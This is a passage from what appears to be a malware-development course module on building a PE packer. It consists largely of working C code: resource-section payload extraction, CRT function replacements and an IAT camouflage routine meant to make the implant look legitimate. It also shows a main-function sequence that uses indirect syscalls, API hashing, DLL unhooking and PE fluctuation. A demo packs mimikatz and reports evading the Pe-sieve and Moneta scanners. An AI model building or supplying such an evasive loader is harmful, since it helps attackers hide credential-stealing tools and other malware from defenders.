	<span class="token keyword">for</span> <span class="token punctuation">(</span>DWORD i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token punctuation">(</span>pResourceDir<span class="token operator">-&gt;</span>NumberOfNamedEntries <span class="token operator">+</span> pResourceDir<span class="token operator">-&gt;</span>NumberOfIdEntries<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

		<span class="token keyword">if</span> <span class="token punctuation">(</span>pResourceEntry<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>DataIsDirectory <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
			<span class="token keyword">break</span><span class="token punctuation">;</span>

		pResourceDir2	<span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_RESOURCE_DIRECTORY<span class="token punctuation">)</span><span class="token punctuation">(</span>pBaseAddr <span class="token operator">+</span> pDataDir<span class="token operator">-&gt;</span>VirtualAddress <span class="token operator">+</span> <span class="token punctuation">(</span>pResourceEntry<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>OffsetToDirectory <span class="token operator">&amp;</span> <span class="token number">0x7FFFFFFF</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		pResourceEntry2 <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_RESOURCE_DIRECTORY_ENTRY<span class="token punctuation">)</span><span class="token punctuation">(</span>pResourceDir2 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

		<span class="token keyword">if</span> <span class="token punctuation">(</span>pResourceEntry2<span class="token operator">-&gt;</span>DataIsDirectory <span class="token operator">==</span> <span class="token number">1</span> <span class="token operator">&amp;&amp;</span> pResourceEntry2<span class="token operator">-&gt;</span>Id <span class="token operator">==</span> ResourceId<span class="token punctuation">)</span> <span class="token punctuation">{</span>

			pResourceDir3   <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_RESOURCE_DIRECTORY<span class="token punctuation">)</span><span class="token punctuation">(</span>pBaseAddr <span class="token operator">+</span> pDataDir<span class="token operator">-&gt;</span>VirtualAddress <span class="token operator">+</span> <span class="token punctuation">(</span>pResourceEntry2<span class="token operator">-&gt;</span>OffsetToDirectory <span class="token operator">&amp;</span> <span class="token number">0x7FFFFFFF</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			pResourceEntry3 <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_RESOURCE_DIRECTORY_ENTRY<span class="token punctuation">)</span><span class="token punctuation">(</span>pResourceDir3 <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			pResource       <span class="token operator">=</span> <span class="token punctuation">(</span>PIMAGE_RESOURCE_DATA_ENTRY<span class="token punctuation">)</span><span class="token punctuation">(</span>pBaseAddr <span class="token operator">+</span> pDataDir<span class="token operator">-&gt;</span>VirtualAddress <span class="token operator">+</span> <span class="token punctuation">(</span>pResourceEntry3<span class="token operator">-&gt;</span>OffsetToData <span class="token operator">&amp;</span> <span class="token number">0x7FFFFFFF</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

			<span class="token operator">*</span>ppResourceRawData	<span class="token operator">=</span> <span class="token punctuation">(</span>PVOID<span class="token punctuation">)</span><span class="token punctuation">(</span>pBaseAddr <span class="token operator">+</span> <span class="token punctuation">(</span>pResource<span class="token operator">-&gt;</span>OffsetToData<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
			<span class="token operator">*</span>psResourceDataSize 	<span class="token operator">=</span> pResource<span class="token operator">-&gt;</span>Size<span class="token punctuation">;</span>

			<span class="token keyword">break</span><span class="token punctuation">;</span>
		<span class="token punctuation">}</span>

	<span class="token punctuation">}</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span>ppResourceRawData <span class="token operator">!=</span> <span class="token constant">NULL</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">*</span>psResourceDataSize <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>

	<span class="token keyword">return</span> FALSE<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<br>
<h3 id="toc-heading-26">The Main Function</h3>
<p>Once the implementation is completed, the main function should 
proceed to execute the following functions in the order provided below:</p>
<ul>
<li>
<p><code>InitIndirectSyscalls</code> - Initialize HellsHall indirect syscalls.</p>
</li>
<li>
<p><code>InitializeWinAPIs</code> - Initialize WinAPIs function pointers via API hashing.</p>
</li>
<li>
<p><code>GetDecompressedResourcePayload</code> - Fetch the compressed PE payload from the resource section and decompress it using the LZW algorithm.</p>
</li>
<li>
<p><code>InitializePeStruct</code> -  Initialize a <code>PE_HDRS</code> struct that will contain all the required information to execute the PE payload.</p>
</li>
<li>
<p><code>LocalPeExecAndFluctuate</code> - Execute the PE, unhook loaded DLLs, and perform PEFluctuation.</p>
</li>
</ul>
<h4 id="toc-heading-27">The AddWin32uToIat Function - Loading win32u.dll</h4>
<p>It is important to load the <code>win32u.dll</code> module before calling the <code>InitIndirectSyscalls</code> function, for its crucial rule in executing syscalls. In the <em>Building An Evasive DLL Payload Loader</em> module, <code>win32u.dll</code> was loaded by adding <code>shell32.dll</code> to the implant's IAT. <code>shell32.dll</code> loads <code>win32u.dll</code>, ensuring that the latter DLL is loaded. To add <code>shell32.dll</code> to the IAT, one can call any function that it exports, which is done in the following <code>AddWin32uToIat</code> function where <a href="https://learn.microsoft.com/en-us/windows/win32/api/shlobj_core/nf-shlobj_core-shgetfolderpathw" target="_blank">SHGetFolderPathW</a> was used.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token comment">// This function loads win32u.dll into the IAT</span>

VOID <span class="token function">AddWin32uToIat</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	WCHAR szPath<span class="token punctuation">[</span>MAX_PATH<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">{</span> <span class="token number">0</span> <span class="token punctuation">}</span><span class="token punctuation">;</span>
	<span class="token function">SHGetFolderPathW</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> CSIDL_MYVIDEO<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> szPath<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<br>
<h3 id="toc-heading-28">CRT Library Function Replacement</h3>
<p>As done in multiple modules across the course, when building a 
real-world implant, it is advised to remove the CRT library by following
 the steps in the <em>CRT Library Removal &amp; Malware Compiling</em> 
module. As mentioned in the aforementioned module, when the CRT library 
is removed, certain functions will become unusable and will require a 
custom implementation. These custom functions have been re-created 
below.</p>
<h4 id="toc-heading-29">Replacing rand()</h4>
<p><code>rand</code> is replaced with <code>GenerateRandomInt</code>.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">int</span> <span class="token function">GenerateRandomInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>
    <span class="token keyword">static</span> <span class="token keyword">unsigned</span> <span class="token keyword">int</span> state <span class="token operator">=</span> <span class="token number">123456789</span><span class="token punctuation">;</span>
    state <span class="token operator">^=</span> state <span class="token operator">&lt;&lt;</span> <span class="token number">13</span><span class="token punctuation">;</span>
    state <span class="token operator">^=</span> state <span class="token operator">&gt;&gt;</span> <span class="token number">17</span><span class="token punctuation">;</span>
    state <span class="token operator">^=</span> state <span class="token operator">&lt;&lt;</span> <span class="token number">5</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> state<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<h3 id="toc-heading-30">Replacing wcscat()</h3>
<p><code>wcscat</code> is replaced with <code>Wcscat</code>.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">VOID <span class="token function">Wcscat</span><span class="token punctuation">(</span>IN WCHAR<span class="token operator">*</span> pDest<span class="token punctuation">,</span> IN WCHAR<span class="token operator">*</span> pSource<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">*</span>pDest <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span>
        pDest<span class="token operator">++</span><span class="token punctuation">;</span>

    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">*</span>pSource <span class="token operator">!=</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token operator">*</span>pDest <span class="token operator">=</span> <span class="token operator">*</span>pSource<span class="token punctuation">;</span>
        pDest<span class="token operator">++</span><span class="token punctuation">;</span>
        pSource<span class="token operator">++</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token operator">*</span>pDest <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<h3 id="toc-heading-31">Replacing memcpy</h3>
<p><code>memcpy</code> is replaced with <code>Memcpy</code>.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">VOID <span class="token function">Memcpy</span><span class="token punctuation">(</span>IN PVOID pDestination<span class="token punctuation">,</span> IN PVOID pSource<span class="token punctuation">,</span> SIZE_T sLength<span class="token punctuation">)</span> <span class="token punctuation">{</span>

    PBYTE D <span class="token operator">=</span> <span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pDestination<span class="token punctuation">;</span>
    PBYTE S <span class="token operator">=</span> <span class="token punctuation">(</span>PBYTE<span class="token punctuation">)</span>pSource<span class="token punctuation">;</span>

    <span class="token keyword">while</span> <span class="token punctuation">(</span>sLength<span class="token operator">--</span><span class="token punctuation">)</span>
        <span class="token operator">*</span>D<span class="token operator">++</span> <span class="token operator">=</span> <span class="token operator">*</span>S<span class="token operator">++</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<h3 id="toc-heading-32">Intrinsic Functions</h3>
<p>In addition to function replacements at runtime, the compiler required a custom declaration for the <code>memset</code> and <code>strrchr</code> functions, which is done via the <code>intrinsic</code> keyword. Again, this was explained and used in the same previously mentioned module.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c"><span class="token comment">// replaces 'memset' while compiling</span>
<span class="token keyword">extern</span> <span class="token keyword">void</span><span class="token operator">*</span> __cdecl <span class="token function">memset</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">,</span> <span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression"><span class="token function">intrinsic</span><span class="token punctuation">(</span>memset<span class="token punctuation">)</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression"><span class="token function">function</span><span class="token punctuation">(</span>memset<span class="token punctuation">)</span></span></span>
<span class="token keyword">void</span><span class="token operator">*</span> __cdecl <span class="token function">memset</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token operator">*</span> pTarget<span class="token punctuation">,</span> <span class="token keyword">int</span> value<span class="token punctuation">,</span> <span class="token class-name">size_t</span> cbTarget<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span> p <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>pTarget<span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span>cbTarget<span class="token operator">--</span> <span class="token operator">&gt;</span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token operator">*</span>p<span class="token operator">++</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">char</span><span class="token punctuation">)</span>value<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> pTarget<span class="token punctuation">;</span>
<span class="token punctuation">}</span>


<span class="token comment">// replaces 'strrchr' while compiling. </span>
<span class="token keyword">extern</span> <span class="token keyword">void</span><span class="token operator">*</span> __cdecl <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">,</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression"><span class="token function">intrinsic</span><span class="token punctuation">(</span>strrchr<span class="token punctuation">)</span></span></span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">pragma</span> <span class="token expression"><span class="token function">function</span><span class="token punctuation">(</span>strrchr<span class="token punctuation">)</span></span></span>
<span class="token keyword">char</span><span class="token operator">*</span> <span class="token function">strrchr</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span><span class="token operator">*</span> str<span class="token punctuation">,</span> <span class="token keyword">int</span> c<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">char</span><span class="token operator">*</span> last_occurrence <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>  
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">*</span>str<span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span>str <span class="token operator">==</span> c<span class="token punctuation">)</span> <span class="token punctuation">{</span>
            last_occurrence <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>str<span class="token punctuation">;</span>  
        <span class="token punctuation">}</span>
        str<span class="token operator">++</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">return</span> last_occurrence<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<h3 id="toc-heading-33">IAT Camouflage</h3>
<p>Upon removing the CRT library, and especially when using API hashing,
 the implant's IAT will import very few functions over a few DLL 
modules. This can be used to identify a packed executable image as shown
 in the <em>IAT Camouflage</em> module. Therefore, using IAT camouflage,
 which is done by adding whitelisted APIs to the implant's IAT will make
 our implant look more legitimate.</p>
<p>When the <code>IatCamouflage</code> function below is invoked, the WinAPIs listed within it are added to its IAT.</p>
<div class="code-toolbar"><pre class="language-c" tabindex="0"><code class="language-c">VOID <span class="token function">DummyAllocation</span><span class="token punctuation">(</span>OUT DWORD<span class="token operator">*</span> pdwRandNmbr<span class="token punctuation">)</span> <span class="token punctuation">{</span>

	<span class="token operator">*</span><span class="token punctuation">(</span>DWORD<span class="token operator">*</span><span class="token punctuation">)</span>pdwRandNmbr <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>DWORD<span class="token operator">*</span><span class="token punctuation">)</span>pdwRandNmbr <span class="token operator">+</span> <span class="token function">GenerateRandomInt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">*</span>pdwRandNmbr <span class="token operator">&gt;</span> <span class="token number">0x491fd3a1</span><span class="token punctuation">)</span>
		<span class="token keyword">return</span><span class="token punctuation">;</span>

	<span class="token function">DummyAllocation</span><span class="token punctuation">(</span>pdwRandNmbr<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>



BOOL <span class="token function">IatCamouflage</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>

	DWORD	dwNmbr <span class="token operator">=</span> <span class="token number">0x00</span><span class="token punctuation">;</span>

	<span class="token function">DummyAllocation</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>dwNmbr<span class="token punctuation">)</span><span class="token punctuation">;</span>

	<span class="token keyword">if</span> <span class="token punctuation">(</span>dwNmbr <span class="token operator">&lt;</span> <span class="token number">0xFFFFFF</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
		<span class="token function">RegCloseKey</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">RegDeleteKeyExA</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">RegDeleteKeyExW</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">RegEnumKeyExA</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">RegEnumKeyExW</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">RegEnumValueW</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">RegEnumValueA</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">RegGetValueA</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">RegGetValueW</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">RegisterServiceCtrlHandlerA</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token function">RegisterServiceCtrlHandlerW</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
		<span class="token keyword">return</span> <span class="token operator">!</span><span class="token function">GetLastError</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
	<span class="token punctuation">}</span>

	<span class="token keyword">return</span> TRUE<span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="toolbar"><div class="toolbar-item"><button class="copy-to-clipboard-button" type="button" data-copy-state="copy"><span>Copy</span></button></div></div></div>
<br>
<h3 id="toc-heading-34">Demo</h3>
<p>In this demo, <code>mimikatz.exe</code> will be packed and executed using the implementation built in this module:</p>
<ul>
<li>Compressing <code>mimikatz.exe</code> with <code>PeCompressor.exe</code> and outputting the <code>PeFileCompressed.lzw</code> file.</li>
</ul>
<img width="900px" style="margin:auto" alt="image" src="31_files/pepacker-376839836-809bbff7-192a-419f-8fdf-6dd41b8efa8e.png">
<ul>
<li>After replacing the <code>PeFileCompressed.lzw</code> file with the new one, compiling <code>PePacker</code> and running it will show <code>mimikatz</code>'s console.</li>
</ul>
<img width="900px" style="margin:auto" alt="image" src="31_files/pepacker-476840139-032e3a97-cd7a-4306-8a7b-5b730efbb9da.png">
<ul>
<li>Scanning <code>PePacker.exe</code> with <code>Pesieve</code> and successfully bypassing it even with maximum intensity scan flags.</li>
</ul>
<img width="900px" style="margin:auto" alt="image" src="31_files/pepacker-576840941-d4236333-9325-4eab-8484-212f3e5a0992.png">
<ul>
<li>Scanning <code>PePacker.exe</code> with <code>Moneta</code> and successfully bypassing it.</li>
</ul>
<img width="900px" style="margin:auto" alt="image" src="31_files/pepacker-676841231-fe531fdc-a0c3-4e5f-845f-a8e6c759ddf7.png">

    </div>

    
        
</div></div>              </div>
              
              <div id="accessory-container" class="flex flex-col h-full lg:min-w-[500px] w-[500px]">
    <div id="objectives" class="hidden p-4 border-r border-b bg-gray-900 border-gray-600 font-code w-full h-full">
        <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg">Objectives</div>
                                                                                    <div class="flex items-center mb-2 font-sans">
                    <input type="checkbox" id="objective-0" data-objective-id="0" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                    <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Use an alternative string hashing algorithm</label>
                </div>
                                                                                            <div class="flex items-center mb-2 font-sans">
                    <input type="checkbox" id="objective-1" data-objective-id="1" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                    <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Save the initial payload size at the start of the PeFileCompressed.lzw file instead of saving it at the end</label>
                </div>
                                                                                            <div class="flex items-center mb-2 font-sans">
                    <input type="checkbox" id="objective-2" data-objective-id="2" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                    <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Reduce the compressed payload entropy in the PePacker implant</label>
                </div>
                                                                                            <div class="flex items-center mb-2 font-sans">
                    <input type="checkbox" id="objective-3" data-objective-id="3" class="flex-none w-4 h-4 text-blue-600 bg-gray-100 rounded border-gray-300 focus:ring-blue-500 dark:focus:ring-blue-600 dark:ring-offset-gray-800 focus:ring-2 dark:bg-gray-700 dark:border-gray-600">
                    <label class="ml-2 text-sm font-medium text-gray-900 dark:text-gray-300">Test the implant against memory scanner tools like Pe-sieve and Moneta</label>
                </div>
                                              
    </div>
    <div id="toc-container" class=" p-4 border-r border-b border-gray-600 w-full h-full">
    <div class="sticky top-0 bg-gray-800 rounded-xl">
        <div class="w-full bg-gray-700 text-center mb-4 font-sans text-lg rounded-t-xl">
        Table of Contents
        </div>

        
        

        
        <div id="toc-content" class="min-h-[70vh] max-h-[70vh] overflow-y-auto rounded-b-xl pr-2">
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:40px" data-target-id="toc-heading-0">
        <span class="text-gray-300 hover:text-white text-sm">Building A PE Packer</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-1">
        <span class="text-gray-300 hover:text-white text-sm">Introduction</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-2">
        <span class="text-gray-300 hover:text-white text-sm">Loader's Capabilities</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-3">
        <span class="text-gray-300 hover:text-white text-sm">Using the Enhanced HellsHall</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-4">
        <span class="text-gray-300 hover:text-white text-sm">Unhooking Without RWX permissions</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-5">
        <span class="text-gray-300 hover:text-white text-sm">API Hashing</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-6">
        <span class="text-gray-300 hover:text-white text-sm">CRC String Hashing</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-7">
        <span class="text-gray-300 hover:text-white text-sm">WINAPIs Structure</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-8">
        <span class="text-gray-300 hover:text-white text-sm">InitializeWinAPIs Function</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-9">
        <span class="text-gray-300 hover:text-white text-sm">HashCalculator Program</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-10">
        <span class="text-gray-300 hover:text-white text-sm">Reusing LocalPeExec Functions</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-11">
        <span class="text-gray-300 hover:text-white text-sm">PEFluctuation Implementation</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-12">
        <span class="text-gray-300 hover:text-white text-sm">Rc4EncryptDecrypt</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-13">
        <span class="text-gray-300 hover:text-white text-sm">PeFluctuationVectoredExceptionHandler</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-14">
        <span class="text-gray-300 hover:text-white text-sm">Using Critical Sections</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-15">
        <span class="text-gray-300 hover:text-white text-sm">Random RC4 Key Generator</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:80px" data-target-id="toc-heading-16">
        <span class="text-gray-300 hover:text-white text-sm">The Complete Rc4EncryptDecrypt Function</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-17">
        <span class="text-gray-300 hover:text-white text-sm">The LocalPeExecAndFluctuate Function</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-18">
        <span class="text-gray-300 hover:text-white text-sm">LZW Data Compression Algorithm</span>
      </div>
      <div class="py-2 px-2 hover:bg-gray-600 cursor-pointer transition-colors" style="padding-left:60px" data-target-id="toc-heading-19">
